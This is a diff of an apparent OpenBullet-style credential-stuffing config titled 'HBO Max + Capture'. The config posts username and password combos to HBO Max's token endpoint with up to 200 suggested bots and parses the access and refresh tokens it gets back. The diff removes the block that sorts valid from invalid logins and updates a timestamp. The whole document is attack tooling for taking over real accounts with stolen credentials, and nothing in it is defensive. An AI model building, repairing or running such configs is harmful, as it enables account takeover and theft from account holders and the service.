@@ -3,7 +3,7 @@
   "Name": "HBO Max + Capture",
   "SuggestedBots": 200,
   "MaxCPM": 0,
-  "LastModified": "2025-08-17 23:44:00",
+  "LastModified": "2025-08-17 23:48:47",
   "AdditionalInfo": "",
   "RequiredPlugins": [],
   "Author": "Vlaq",
@@ -43,10 +43,6 @@ REQUEST POST "https://comet.api.hbo.com/tokens"
   HEADER "Sec-Fetch-Mode: cors"
   HEADER "Sec-Fetch-Site: cross-site"
   POSTDATA "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"scope\":\"browse video_playback_free\"}"
-
-KEYCHECK
-  KEYCHAIN Success OR "access_token"
-  KEYCHAIN Failure OR "Invalid credentials" OR "Authentication failed" OR "error"
 
 PARSE "<SOURCE>" JSON "access_token" "access_token"
 PARSE "<SOURCE>" JSON "refresh_token" "refresh_token"
